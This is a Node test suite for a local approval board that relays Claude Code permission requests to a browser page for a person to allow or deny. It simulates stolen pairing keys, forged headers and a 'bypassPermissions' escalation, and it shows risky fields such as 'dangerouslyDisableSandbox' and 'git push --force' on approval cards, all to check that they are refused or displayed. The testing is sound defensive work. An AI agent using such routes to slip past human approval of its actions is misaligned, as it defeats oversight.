// Approvals on the board (D3, #1318): the board's server from source, the page played by these
// requests, and Claude Code's PermissionRequest hook (scripts/claude-approval.mjs) run as the host
// would run it, with a synthetic request on its input. No model, no browser.
import { execFileSync, spawn } from 'node:child_process'
import { createServer } from 'node:http'
import { linkSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { registerHooks } from 'node:module'
import { fileURLToPath } from 'node:url'
import { after, test } from 'node:test'
import assert from 'node:assert/strict'

// The server and page modules use the host's extensionless imports; resolve only those local
// paths, as tests/messaging.test.mjs does.
registerHooks({ resolve(specifier, context, next) {
  try { return next(specifier, context) } catch (error) {
    if (error.code !== 'ERR_MODULE_NOT_FOUND' || !specifier.startsWith('.')) throw error
    return next(`${specifier}.ts`, context)
  }
} })
const { startServer } = await import('../scripts/board-serve.ts')
const { privateRuntimeFolder, writePrivateRuntimeFile } = await import('../scripts/runtime-folder.ts')
const { APPROVAL_DRAW_MS, APPROVAL_GRACE_MS, APPROVAL_PRESS_MS, APPROVAL_SECRET_MS, approvalCards, approvalOf, approvalsPayload, decisionOf, readAsk } = await import('../hooks/approvals.ts')
const { addressFileName: receiverFileName, addressKey: receiverKey, parseAddress: receiverParse } = await import('../hooks/receiver.ts')
const { parseProgress } = await import('../hooks/parse.ts')
const { buildView } = await import('../hooks/view.ts')
const { EN } = await import('../hooks/strings-en.ts')
const { ZH_TW } = await import('../hooks/i18n.ts')
const { ZH_CN } = await import('../hooks/strings-zh-cn.ts')
const hook = await import('../scripts/claude-approval.mjs')

const HOOK = fileURLToPath(new URL('../scripts/claude-approval.mjs', import.meta.url))
const isWindows = process.platform === 'win32'
const pause = ms => new Promise(done => setTimeout(done, ms))
const roots = []
const boards = []
after(async () => {
  for (const board of boards) await board.close()
  for (const root of roots) rmSync(root, { recursive: true, force: true })
})

// A home of its own with a progress file, and the address file where the hook looks for it.
const homeFor = (url, pid = process.pid) => {
  const root = mkdtempSync(join(tmpdir(), 'approvals-'))
  roots.push(root)
  const home = join(root, 'home')
  const progress = join(home, '.claude', 'progress.md')
  mkdirSync(join(home, '.claude'), { recursive: true })
  writeFileSync(progress, '# Progress\n')
  const folder = join(home, '.cache', 'agent-board')
  mkdirSync(folder, { recursive: true, mode: 0o700 })
  const file = join(folder, receiverFileName(receiverKey(progress)))
  const writeAddress = (address, owner = pid) => writeFileSync(file, JSON.stringify({ pid: owner, port: Number(new URL(address).port), url: address, path: progress, built: '' }), { mode: 0o600 })
  if (url !== undefined) writeAddress(url)
  const env = { ...Object.fromEntries(Object.entries(process.env).filter(([name]) => !/^(CLAUDE_|XDG_RUNTIME_DIR$|HOME$|USERPROFILE$)/.test(name))), HOME: home, USERPROFILE: home }
  return { root, home, progress, file, env, writeAddress }
}

// A board started from source, with the tests' shorter waits. No grace window unless a test asks.
// `open` stands in for the browser opener; the default opens the page and says so.
const startBoard = async ({ drawMs = 3_000, pressMs = 8_000, secretMs = 60_000, graceMs = 0, open } = {}) => {
  let self
  const place = homeFor()
  const messages = join(place.root, 'messages')
  mkdirSync(messages)
  const opened = []
  const journal = []
  let stopped
  const isStopped = new Promise(done => { stopped = done })
  const address = await new Promise((resolve, reject) => {
    startServer({
      port: 0, messagesDirectory: messages, routes: [], s: EN, ping: {},
      view: () => buildView(parseProgress(readFileSync(place.progress, 'utf8')), [], null, Date.now(), 0, {}, EN),
      pending: () => [], act: () => '', tidy: () => '', clean: () => '', sweep: () => {}, sweepMs: 60_000,
      paste: () => ({ isAdded: false, note: '' }), failure: () => null, idleMs: 0,
      approvalTimes: { drawMs, pressMs, secretMs, graceMs },
      // The browser stand-in: the address the board would open, with its one-time key.
      open: async url => { opened.push(url); return open === undefined ? true : open(url, self) },
      journal: entry => { journal.push(entry) },
      onReady: url => { resolve(url); return true },
      onStop: () => { stopped(); reject(new Error('stopped before ready')) },
    })
  })
  place.writeAddress(address)
  const url = new URL(address)
  const token = url.searchParams.get('t')
  const origin = `http://127.0.0.1:${url.port}`
  const call = async (path, body, headers = {}) => {
    const response = await fetch(new URL(path, origin), { method: body === undefined ? 'GET' : 'POST', headers: { 'x-board-token': token, ...(body === undefined ? {} : { 'content-type': 'application/json' }), ...headers }, body: body === undefined ? undefined : JSON.stringify(body) })
    const text = await response.text()
    return { status: response.status, text, body: text === '' ? {} : JSON.parse(text) }
  }
  const board = {
    ...place, address, origin, token, opened, journal, call,
    // The key the board last opened its page with.
    lastKey: () => /#k=([\w-]+)$/.exec(opened.at(-1) ?? '')?.[1],
    close: async () => {
      await call('/api/close', {}).catch(() => undefined)
      await isStopped
    },
  }
  self = board
  boards.push(board)
  return board
}

// The page the board opened: it trades the key for its secret and asks for the board as a page does.
const openPage = async (board, { visible = '1', pageId = 'p-synthetic', pairWithPage = false } = {}) => {
  const opened = await board.call('/api/open', { asApp: true })
  assert.equal(opened.status, 200)
  const key = board.lastKey()
  assert.ok(key, 'the board opened its page with a one-time key')
  const pairHeaders = pairWithPage ? { origin: board.origin, 'x-board-page': pageId } : { origin: board.origin }
  const paired = await board.call('/api/approvals/pair', { key }, pairHeaders)
  assert.equal(paired.status, 200)
  const secret = paired.body.secret
  const headers = { origin: board.origin, 'x-board-page': pageId, 'x-board-visible': visible, 'x-board-approve': secret }
  const page = {
    key, secret, headers,
    look: async () => (await board.call('/api/board', undefined, headers)).body.approvals,
    // Waits until the board shows a request that matches, as the page would draw it.
    find: async (isIt, what) => {
      for (let tries = 0; tries < 100; tries++) {
        const found = (await page.look())?.cards?.find(isIt)
        if (found) return found
        await pause(50)
      }
      throw new Error(`no card for ${what}`)
    },
    card: (command, state) => page.find(one => one.command === command && (state === undefined || one.state === state), command),
    drawn: card => board.call('/api/approvals/drawn', { items: [{ id: card.id, turn: card.turn, state: card.state }] }, headers),
    // Draws the request and waits for the board to mark it shown.
    show: async command => {
      const card = await page.card(command, 'asking')
      assert.equal(card.canPress, false)
      assert.equal((await page.drawn(card)).status, 200)
      const shown = await page.card(command, 'shown')
      assert.equal(shown.canPress, true)
      return shown
    },
    press: (card, behavior, extra = {}) => board.call('/api/approvals/press', { id: card.id, turn: card.turn, state: card.state, behavior, reason: '', ...extra }, headers),
  }
  await page.look()
  return page
}

const request = (command, extra = {}) => ({
  session_id: 'synthetic-session-1',
  prompt_id: 'synthetic-turn-1',
  permission_mode: 'default',
  hook_event_name: 'PermissionRequest',
  tool_name: 'Bash',
  tool_input: { command, description: 'Synthetic command' },
  permission_suggestions: [{ type: 'addDirectories', directories: ['/synthetic'], destination: 'session' }],
  ...extra,
})

// The hook as Claude Code runs it: the request on its input, the answer on its output.
const runHook = (place, input) => {
  const started = Date.now()
  const child = spawn(process.execPath, [HOOK], { env: place.env, stdio: ['pipe', 'pipe', 'pipe'] })
  let out = ''
  child.stdout.on('data', chunk => { out += chunk })
  const done = new Promise(resolve => child.on('exit', code => resolve({ code, out, ms: Date.now() - started, decision: out === '' ? null : JSON.parse(out) })))
  child.stdin.end(JSON.stringify(input))
  let isExited = false
  done.then(() => { isExited = true })
  return { done, isRunning: () => !isExited }
}

test('the hook finds the address file where hooks/receiver.ts names it and reads it the same way', () => {
  const env = { CLAUDE_PROGRESS_FILE: isWindows ? 'C:\\synthetic\\board\\progress.md' : '/synthetic/board/progress.md', HOME: isWindows ? 'C:\\synthetic\\home' : '/synthetic/home', USERPROFILE: isWindows ? 'C:\\synthetic\\home' : '/synthetic/home' }
  const found = hook.addressFile(env, process.platform)
  const key = receiverKey(env.CLAUDE_PROGRESS_FILE)
  assert.equal(found.key, key)
  assert.ok(found.file.endsWith(receiverFileName(key)))
  const text = JSON.stringify({ url: 'http://127.0.0.1:4100/?t=synthetic-token', path: env.CLAUDE_PROGRESS_FILE })
  assert.deepEqual(hook.parseAddress(text, key), receiverParse(text, key))
  assert.equal(hook.parseAddress(JSON.stringify({ url: 'http://example.test:4100/?t=x', path: env.CLAUDE_PROGRESS_FILE }), key), null)
  assert.equal(hook.isRunning(process.pid), true)
  for (const pid of [0, -1, 1.5, '42', undefined]) assert.equal(hook.isRunning(pid), false)
})

test('the hook takes XDG_RUNTIME_DIR as the board does: its own folder, never a link to one (#1368 review)', () => {
  const root = mkdtempSync(join(tmpdir(), 'approvals-runtime-'))
  try {
    const home = join(root, 'home')
    const own = join(root, 'run')
    const link = join(root, 'run-link')
    mkdirSync(home)
    mkdirSync(own, { mode: 0o700 })
    symlinkSync(own, link, 'junction')
    const base = { CLAUDE_PROGRESS_FILE: join(root, 'board', 'progress.md'), HOME: home, USERPROFILE: home }
    // POSIX rules (the only ones that read XDG_RUNTIME_DIR), checked on every system.
    assert.equal(hook.addressFile({ ...base, XDG_RUNTIME_DIR: own }, 'linux').folder, own)
    assert.equal(hook.addressFile({ ...base, XDG_RUNTIME_DIR: link }, 'linux').folder, `${home}/.cache/agent-board`, 'a linked runtime folder is not used, as the board does not use it')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('the hook reads <XDG_RUNTIME_DIR>\\agent-board on Windows only when its ACL is private (#1378)', async () => {
  assert.equal(hook.addressFolder(true, 'C:\\synthetic\\home', 'D:\\synthetic\\run', true), 'D:\\synthetic\\run\\agent-board')
  assert.equal(hook.addressFolder(true, 'C:\\synthetic\\home', 'D:\\synthetic\\run', false), null)
  if (!isWindows) return
  const stand = await allowingBoard()
  const root = mkdtempSync(join(tmpdir(), 'approvals-win-runtime-'))
  try {
    const home = join(root, 'home')
    const own = join(root, 'own')
    const shared = join(root, 'shared')
    const link = join(root, 'link')
    const progress = join(home, '.claude', 'progress.md')
    mkdirSync(join(home, '.claude'), { recursive: true })
    writeFileSync(progress, '# Progress\n')
    const runtimeFolder = privateRuntimeFolder(join(own, 'agent-board'))
    const file = join(runtimeFolder, receiverFileName(receiverKey(progress)))
    const payload = JSON.stringify({ pid: process.pid, port: Number(new URL(stand.url).port), url: stand.url, path: progress, built: '' })
    writePrivateRuntimeFile(file, payload)
    const base = {
      ...Object.fromEntries(Object.entries(process.env).filter(([name]) => !/^(CLAUDE_|XDG_RUNTIME_DIR$|HOME$|USERPROFILE$)/.test(name))),
      CLAUDE_PROGRESS_FILE: progress,
      HOME: home,
      USERPROFILE: home,
    }
    assert.equal(hook.addressFile({ ...base, XDG_RUNTIME_DIR: own }, 'win32')?.folder, runtimeFolder)
    const allowed = await runHook({ env: { ...base, XDG_RUNTIME_DIR: own } }, request('npm run synthetic-win-runtime')).done
    assert.deepEqual(allowed.decision, ALLOW)
    assert.equal(stand.seen.length, 1)

    // Linked runtime folder must not be trusted.
    symlinkSync(own, link, 'junction')
    assert.equal(hook.addressFile({ ...base, XDG_RUNTIME_DIR: link }, 'win32'), null)
    const fromLink = await runHook({ env: { ...base, XDG_RUNTIME_DIR: link } }, request('npm run synthetic-win-link')).done
    assert.equal(fromLink.decision, null)

    // Unprotected runtime folder (e.g. inherited %TEMP% ACLs) must not be trusted.
    const openFolder = join(shared, 'agent-board')
    mkdirSync(openFolder, { recursive: true })
    writeFileSync(join(openFolder, receiverFileName(receiverKey(progress))), payload)
    assert.equal(hook.addressFile({ ...base, XDG_RUNTIME_DIR: shared }, 'win32'), null)
    const fromShared = await runHook({ env: { ...base, XDG_RUNTIME_DIR: shared } }, request('npm run synthetic-win-shared')).done
    assert.equal(fromShared.decision, null)

    // A second hard link or extra read grant on the address file inside a private folder must not be trusted.
    const linkedCopy = join(runtimeFolder, 'hardlink-copy.json')
    linkSync(file, linkedCopy)
    const fromHardlink = await runHook({ env: { ...base, XDG_RUNTIME_DIR: own } }, request('npm run synthetic-win-nlink')).done
    assert.equal(fromHardlink.decision, null)
    rmSync(linkedCopy, { force: true })
    execFileSync(join(process.env.SystemRoot ?? 'C:\\Windows', 'System32', 'icacls.exe'), [file, '/grant', '*S-1-1-0:(R)'], { stdio: 'ignore', windowsHide: true })
    const fromExtraAce = await runHook({ env: { ...base, XDG_RUNTIME_DIR: own } }, request('npm run synthetic-win-ace')).done
    assert.equal(fromExtraAce.decision, null)
    assert.equal(stand.seen.length, 1, 'none of the untrusted runtime layouts reached the board')
  } finally {
    await stand.close()
    rmSync(root, { recursive: true, force: true })
  }
})

test('address discovery shares one budget before asking the board and skips asking when exhausted (#1436 review)', async () => {
  const stand = await allowingBoard()
  try {
    const place = homeFor(stand.url)
    let tick = 0
    const exhausted = await hook.run(place.env, process.platform, {
      input: request('npm run synthetic-discovery-exhausted'),
      discoveryMs: 0,
      now: () => tick,
    })
    assert.equal(exhausted, null)
    assert.deepEqual(stand.seen, [], 'an exhausted discovery budget never asks the board')

    const valid = await hook.run(place.env, process.platform, {
      input: request('npm run synthetic-discovery-ok'),
      now: () => tick,
    })
    assert.deepEqual(valid, ALLOW)
    assert.equal(stand.seen.length, 1)

    if (isWindows) {
      const root = mkdtempSync(join(tmpdir(), 'approvals-win-budget-'))
      try {
        const home = join(root, 'home')
        const own = join(root, 'own')
        const progress = join(home, '.claude', 'progress.md')
        mkdirSync(join(home, '.claude'), { recursive: true })
        writeFileSync(progress, '# Progress\n')
        const runtimeFolder = privateRuntimeFolder(join(own, 'agent-board'))
        const file = join(runtimeFolder, receiverFileName(receiverKey(progress)))
        writePrivateRuntimeFile(file, JSON.stringify({ pid: process.pid, port: Number(new URL(stand.url).port), url: stand.url, path: progress, built: '' }))
        const env = {
          ...Object.fromEntries(Object.entries(process.env).filter(([name]) => !/^(CLAUDE_|XDG_RUNTIME_DIR$|HOME$|USERPROFILE$)/.test(name))),
          CLAUDE_PROGRESS_FILE: progress,
          HOME: home,
          USERPROFILE: home,
          XDG_RUNTIME_DIR: own,
        }
        const sid = 'S-1-5-21-1000-2000-3000-1001'
        const sddls = [`O:${sid}G:${sid}D:P(A;OICI;FA;;;${sid})`, `O:${sid}G:${sid}D:AI(A;ID;FA;;;${sid})`]
        const seenTimeouts = []

        // First probe takes 4 s, leaving 6 s (not a full 10 s or 30 s) for PowerShell; total 7 s < 10 s proceeds.
        tick = 0
        const withinBudget = await hook.run(env, 'win32', {
          input: request('npm run synthetic-win-within-budget'),
          now: () => tick,
          probeAccount: timeout => { seenTimeouts.push(['account', timeout]); tick += 4_000; return { sid, aliases: {} } },
          probeAcls: (_files, timeout) => { seenTimeouts.push(['acls', timeout]); tick += 3_000; return sddls },
        })
        assert.deepEqual(seenTimeouts, [['account', hook.DISCOVERY_MS], ['acls', hook.DISCOVERY_MS - 4_000]])
        assert.deepEqual(withinBudget, ALLOW)
        assert.equal(stand.seen.length, 2)

        // Combined 4 s + 6 s consumes the 10 s discovery budget -> even with valid SDDL, the board is not asked.
        tick = 0
        const spentBudget = await hook.run(env, 'win32', {
          input: request('npm run synthetic-win-spent-budget'),
          now: () => tick,
          probeAccount: () => { tick += 4_000; return { sid, aliases: {} } },
          probeAcls: () => { tick += hook.DISCOVERY_MS - 4_000; return sddls },
        })
        assert.equal(spentBudget, null)
        assert.equal(stand.seen.length, 2)

        // First probe alone uses the entire budget -> PowerShell is never started.
        let aclCalls = 0
        tick = 0
        const firstExhausts = await hook.run(env, 'win32', {
          input: request('npm run synthetic-win-first-exhausts'),
          now: () => tick,
          probeAccount: () => { tick += hook.DISCOVERY_MS; return { sid, aliases: {} } },
          probeAcls: () => { aclCalls++; return sddls },
        })
        assert.equal(firstExhausts, null)
        assert.equal(aclCalls, 0)
        assert.equal(stand.seen.length, 2)
      } finally {
        rmSync(root, { recursive: true, force: true })
      }
    }
  } finally {
    await stand.close()
  }
})

test('the hook only ever answers allow, or deny with a message, and never adds a standing rule', () => {
  assert.deepEqual(hook.decisionOutput({ behavior: 'allow', updatedPermissions: [{ type: 'setMode', mode: 'bypassPermissions' }] }), { hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } } })
  assert.deepEqual(hook.decisionOutput({ behavior: 'deny', message: 'Synthetic reason', interrupt: true }), { hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'deny', message: 'Synthetic reason' } } })
  for (const other of [null, {}, 'yes', { behavior: 'ask' }, { behavior: 'always' }, { behavior: 'deny' }]) assert.equal(hook.decisionOutput(other), null)
})

test('allow once reaches only the request it was pressed for', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  const first = runHook(board, request('npm run synthetic-first'))
  const second = runHook(board, request('npm run synthetic-second'))
  const one = await page.show('npm run synthetic-first')
  const two = await page.show('npm run synthetic-second')
  assert.equal((await page.press(one, 'allow', { confirmed: true })).status, 200)
  const answered = await first.done
  assert.deepEqual(answered.decision, { hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } } })
  assert.equal(second.isRunning(), true, 'the other request still waits')
  assert.equal((await page.press(two, 'deny')).status, 200)
  assert.equal((await second.done).decision.hookSpecificOutput.decision.behavior, 'deny')
  assert.doesNotMatch(answered.out + (await second.done).out, /updatedPermissions|updatedInput|interrupt/)
})

test('a press with an old id, another turn or another state is refused and nothing reaches the hook', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  const waiting = runHook(board, request('npm run synthetic-refused'))
  const asking = await page.card('npm run synthetic-refused', 'asking')
  // Drawn as asking, pressed before the board marked it shown.
  assert.equal((await page.press(asking, 'allow', { confirmed: true })).status, 409)
  const card = await page.show('npm run synthetic-refused')
  assert.equal((await page.press({ ...card, turn: 'synthetic-turn-0' }, 'allow', { confirmed: true })).status, 409)
  assert.equal((await page.press({ ...card, state: 'asking' }, 'allow', { confirmed: true })).status, 409)
  assert.equal((await page.press({ ...card, id: 'synthetic-old-id' }, 'allow', { confirmed: true })).status, 409)
  assert.equal(waiting.isRunning(), true)
  assert.equal((await page.press(card, 'deny', { confirmed: true })).status, 200)
  await waiting.done
  // The same request again, once answered.
  const again = await page.press(card, 'allow', { confirmed: true })
  assert.equal(again.status, 409)
  assert.equal(again.body.note, EN.approvalChanged)
})

test('a press without the page secret is refused, whatever Origin it sends', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  const waiting = runHook(board, request('npm run synthetic-secret'))
  const card = await page.show('npm run synthetic-secret')
  const body = { id: card.id, turn: card.turn, state: card.state, behavior: 'allow', confirmed: true }
  // A program can send the page's Origin; only the secret counts.
  assert.equal((await board.call('/api/approvals/press', body, { origin: board.origin })).status, 403)
  assert.equal((await board.call('/api/approvals/press', body, { origin: board.origin, 'x-board-approve': 'synthetic-made-up-secret' })).status, 403)
  assert.equal((await board.call('/api/approvals/press', body, { origin: board.origin, 'x-board-approve': board.token })).status, 403)
  assert.equal(waiting.isRunning(), true)
  assert.equal((await page.press(card, 'allow', { confirmed: true })).status, 200)
  assert.equal((await waiting.done).decision.hookSpecificOutput.decision.behavior, 'allow')
})

test('the first press for a session waits for the confirm on the page, and later ones do not', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  const first = runHook(board, request('npm run synthetic-confirm'))
  const card = await page.show('npm run synthetic-confirm')
  const unconfirmed = await page.press(card, 'allow')
  assert.equal(unconfirmed.status, 428)
  assert.equal(unconfirmed.body.needsConfirm, true)
  await pause(200)
  assert.equal(first.isRunning(), true, 'nothing was sent before the confirm')
  assert.equal((await page.press(card, 'allow', { confirmed: true })).status, 200)
  await first.done
  const second = runHook(board, request('npm run synthetic-after-confirm'))
  const next = await page.show('npm run synthetic-after-confirm')
  assert.equal((await page.press(next, 'allow')).status, 200)
  assert.equal((await second.done).decision.hookSpecificOutput.decision.behavior, 'allow')
})

test('with no page the board opened, the hook returns at once and the row says asked in its window', async () => {
  const board = await startBoard()
  // Before any host asks, a page that is open is enough: the board script opens no other.
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, false)
  const alone = await runHook(board, request('npm run synthetic-no-page')).done
  assert.equal(alone.code, 0)
  assert.equal(alone.decision, null)
  assert.ok(alone.ms < 5_000, `returned in ${alone.ms} ms`)
  // A page opened from the printed address (no key) looks, but cannot hold a request either.
  const plain = { origin: board.origin, 'x-board-page': 'p-plain', 'x-board-visible': '1' }
  const shown = (await board.call('/api/board', undefined, plain)).body.approvals.cards
  assert.equal(shown[0].state, 'window')
  assert.equal(shown[0].canPress, false)
  assert.equal(shown[0].note, EN.approvalAskedInWindow)
  // The board script sees that no open page can answer, and opens one with a key instead.
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, true)
  const again = await runHook(board, request('npm run synthetic-plain-page')).done
  assert.equal(again.decision, null)
  assert.ok(again.ms < 5_000)
  // No board at all: the same.
  rmSync(board.file)
  assert.equal((await runHook(board, request('npm run synthetic-no-board')).done).decision, null)
})

test('a page in the background makes the hook fall back at once', async () => {
  const board = await startBoard()
  const page = await openPage(board, { visible: '0' })
  // Its secret is alive, so the board script does not open another window over it.
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, false)
  const hidden = await runHook(board, request('npm run synthetic-hidden')).done
  assert.equal(hidden.decision, null)
  assert.ok(hidden.ms < 2_500, `returned in ${hidden.ms} ms`)
  assert.equal((await page.card('npm run synthetic-hidden')).note, EN.approvalAskedInWindow)
})

test('a page secret no page asked with past its window is dropped and refused', async () => {
  assert.equal(APPROVAL_SECRET_MS, 90_000)
  const board = await startBoard({ secretMs: 600, pressMs: 3_000 })
  const page = await openPage(board)
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, false)
  const waiting = runHook(board, request('npm run synthetic-before-expiry'))
  const card = await page.show('npm run synthetic-before-expiry')
  // The page closes: nothing asks with its secret any more. The waiting request falls back later.
  await pause(900)
  assert.equal((await page.press(card, 'allow', { confirmed: true })).status, 403)
  const late = await page.look()
  assert.ok(late.cards.every(one => one.canPress === false), 'a look with the old secret does not bring it back')
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, true)
  const later = await runHook(board, request('npm run synthetic-after-expiry')).done
  assert.equal(later.decision, null)
  assert.ok(later.ms < 2_500, `returned in ${later.ms} ms`)
  assert.equal(waiting.isRunning(), true)
  await waiting.done
})

test('a page secret is retired at once when its page leaves or a reloaded page polls, so a new keyed page gets buttons immediately (#1378)', async () => {
  const board = await startBoard({ secretMs: APPROVAL_SECRET_MS })
  const first = await openPage(board, { pageId: 'p-first', pairWithPage: true })
  const warmAsk = runHook(board, request('npm run synthetic-before-reload'))
  const warmCard = await first.show('npm run synthetic-before-reload')
  assert.equal((await first.press(warmCard, 'allow', { confirmed: true })).status, 200)
  assert.deepEqual((await warmAsk.done).decision, ALLOW)
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, false)

  // Another page id cannot use the first page's secret.
  const otherHeaders = { origin: board.origin, 'x-board-page': 'p-other', 'x-board-visible': '1', 'x-board-approve': first.secret }
  assert.equal((await board.call('/api/approvals/press', { id: 'x', turn: 't', state: 'shown', behavior: 'allow', reason: '', confirmed: true }, otherHeaders)).status, 403)

  // User reloads without /api/page-gone: the reloaded page carries no secret (#k= was stripped).
  await board.call('/api/board', undefined, { origin: board.origin, 'x-board-page': 'p-reloaded', 'x-board-visible': '1' })
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, true, 'wantsKeyedPage turns true without waiting 90 s')
  assert.equal((await first.press({ id: 'x', turn: 't', state: 'shown' }, 'allow', { confirmed: true })).status, 403)
  assert.equal((await board.call('/api/board', undefined, first.headers)).body.moved, true)

  // A new keyed page opens and approves immediately.
  const second = await openPage(board, { pageId: 'p-second', pairWithPage: true })
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, false)
  const ask1 = runHook(board, request('npm run synthetic-after-reload'))
  const card1 = await second.show('npm run synthetic-after-reload')
  assert.equal((await second.press(card1, 'allow', { confirmed: true })).status, 200)
  assert.deepEqual((await ask1.done).decision, ALLOW)

  // When that page leaves via /api/page-gone, its secret also retires immediately.
  assert.equal((await board.call('/api/page-gone', {}, { origin: board.origin, 'x-board-page': 'p-second' })).status, 200)
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, true, 'wantsKeyedPage turns true immediately after page-gone')
  assert.equal((await second.press(card1, 'allow', { confirmed: true })).status, 403)

  const third = await openPage(board, { pageId: 'p-third', pairWithPage: true })
  const ask2 = runHook(board, request('npm run synthetic-after-gone'))
  const card2 = await third.show('npm run synthetic-after-gone')
  assert.equal((await third.press(card2, 'deny')).status, 200)
  assert.equal((await ask2.done).decision.hookSpecificOutput.decision.behavior, 'deny')
})

test('a pairing key used twice turns approvals off, and neither page can press', async () => {
  const board = await startBoard()
  const page = await openPage(board)
  const waiting = runHook(board, request('npm run synthetic-stolen-key'))
  const card = await page.show('npm run synthetic-stolen-key')
  // The same key again, as a program that read it from the browser's command line would send it.
  const second = await board.call('/api/approvals/pair', { key: page.key }, { origin: board.origin })
  assert.equal(second.status, 403)
  assert.equal(second.body.note, EN.approvalOff)
  assert.equal(second.body.secret, undefined)
  // The waiting request goes to the host's own prompt at once, and the first page cannot press.
  assert.equal((await waiting.done).decision, null)
  const press = await page.press(card, 'allow', { confirmed: true })
  assert.equal(press.status, 403)
  assert.equal(press.body.note, EN.approvalOff)
  const shown = await page.look()
  assert.equal(shown.note, EN.approvalOff)
  assert.ok(shown.cards.every(one => one.canPress === false))
  // Off until the board restarts: a new request falls back at once, a new page opens with no key.
  assert.equal((await runHook(board, request('npm run synthetic-after-off')).done).decision, null)
  assert.equal((await board.call('/api/open', { asApp: true })).body.isOpen, true)
  assert.doesNotMatch(board.opened.at(-1), /#k=/)
  assert.equal((await board.call('/api/ping')).body.wantsKeyedPage, false)
})

test('a page paired a moment ago cannot press until the grace window has passed', async () => {
  assert.equal(APPROVAL_GRACE_MS, 10_000)
  const board = await startBoard({ graceMs: 3_000 })
  const page = await openPage(board)
  const paired = Date.now()
  const waiting = runHook(board, request('npm run synthetic-grace'))
  const card = await page.show('npm run synthetic-grace')
  const early = await page.press(card, 'allow', { confirmed: true })
  assert.equal(early.status, 425)
  assert.match(early.body.note, /^This page has just opened: press again in [123] seconds\.$/)
  assert.equal(waiting.isRunning(), true)
  await pause(Math.max(0, paired + 3_200 - Date.now()))
  assert.equal((await page.press(card, 'allow', { confirmed: true })).status, 200)
  assert.equal((await waiting.done).decision.hookSpecificOutput.decision.behavior, 'allow')
})

test('a board that opens no window where it runs says it tried nothing, and its one-time key is gone', async () => {
  // Over SSH or a test's board: the command that asked opens the page itself, with no key.
  const board = await startBoard({ open: async () => null })
  assert.deepEqual((await board.call('/api/open', { asApp: true })).body, { isOpen: false, hasTried: false })
  const key = board.lastKey()
  assert.ok(key, 'the board made a key before it knew no window would open')
  const paired = await board.call('/api/approvals/pair', { key }, { origin: board.origin })
  assert.equal(paired.status, 403)
  // Refused as an unknown key, not because approvals went off: nobody paired with it.
  assert.equal(paired.body.note, EN.approvalNoSecret)
})

test('a key used though no window opened turns approvals off, so whoever paired with it cannot press', async () => {
  // The opener ran but no browser came up, and a program that read the key from its command line paired first.
  let stolen = ''
  const board = await startBoard({
    open: async (url, self) => {
      const key = /#k=([\w-]+)$/.exec(url)?.[1]
      stolen = (await self.call('/api/approvals/pair', { key }, { origin: self.origin })).body.secret ?? ''
      return false
    },
  })
  assert.deepEqual((await board.call('/api/open', { asApp: true })).body, { isOpen: false, hasTried: true })
  assert.notEqual(stolen, '', 'the stand-in paired with the key')
  const headers = { origin: board.origin, 'x-board-page': 'p-stolen', 'x-board-visible': '1', 'x-board-approve': stolen }
  await board.call('/api/board', undefined, headers)
  const waiting = runHook(board, request('npm run synthetic-no-window'))
  // With approvals off the hook returns at once and nothing is kept; were they on, the request would
  // wait on the board for the paired program to draw and press.
  let card
  for (let tries = 0; tries < 60 && card === undefined && waiting.isRunning(); tries++) {
    card = (await board.call('/api/board', undefined, headers)).body.approvals?.cards?.find(one => one.command === 'npm run synthetic-no-window')
    if (card === undefined) await pause(50)
  }
  const target = card ?? { id: 'synthetic-id', turn: 'synthetic-turn-1', state: 'asking' }
  await board.call('/api/approvals/drawn', { items: [{ id: target.id, turn: target.turn, state: target.state }] }, headers)
  const press = await board.call('/api/approvals/press', { id: target.id, turn: target.turn, state: 'shown', behavior: 'allow', reason: '', confirmed: true }, headers)
  assert.equal(press.status, 403)
  assert.equal((await waiting.done).decision, null)
  assert.equal((await board.call('/api/board', undefined, headers)).body.approvals?.note, EN.approvalOff)
})

test('the card shows every field of the tool input but its description, after the command', () => {
  const view = buildView(parseProgress('# Progress\n'), [], null, Date.now(), 0, {}, EN)
  const cardOf = (tool, input) => approvalCards([approvalOf(readAsk({ agent: 'claude', session: 'synthetic-session-1', turn: 't', tool, input, mode: 'default' }), 'synthetic-id', 0, '', false, EN)], view, true, EN)[0]
  // Claude Code asks for Bash in sandbox mode because of this field: the person must see it.
  const bash = cardOf('Bash', { command: 'npm run synthetic-build', description: 'Synthetic build', dangerouslyDisableSandbox: true })
  assert.match(bash.command, /dangerouslyDisableSandbox: true/)
  assert.match(bash.command, /^npm run synthetic-build\n/)
  assert.doesNotMatch(bash.command, /Synthetic build/)
  const tool = cardOf('mcp__synthetic__run', { command: 'git', args: ['push', '--force'] })
  assert.match(tool.command, /args: \["push","--force"\]/)
  // A command with nothing else beside its description is shown as it is.
  assert.equal(cardOf('Bash', { command: 'npm run synthetic-plain', description: 'Synthetic' }).command, 'npm run synthetic-plain')
})

test('a request the page never draws, or never presses, falls back to the host prompt', async () => {
  assert.equal(APPROVAL_PRESS_MS, 30_000)
  assert.equal(APPROVAL_DRAW_MS, 5_000)
  const board = await startBoard({ drawMs: 800, pressMs: 2_500 })
  const page = await openPage(board)
  const undrawn = await runHook(board, request('npm run synthetic-undrawn')).done
  assert.equal(undrawn.decision, null)
  assert.ok(undrawn.ms < 2_500, `fell back in ${undrawn.ms} ms`)
  const waiting = runHook(board, request('npm run synthetic-unpressed'))
  const card = await page.show('npm run synthetic-unpressed')
  const unpressed = await waiting.done
  assert.equal(unpressed.decision, null)
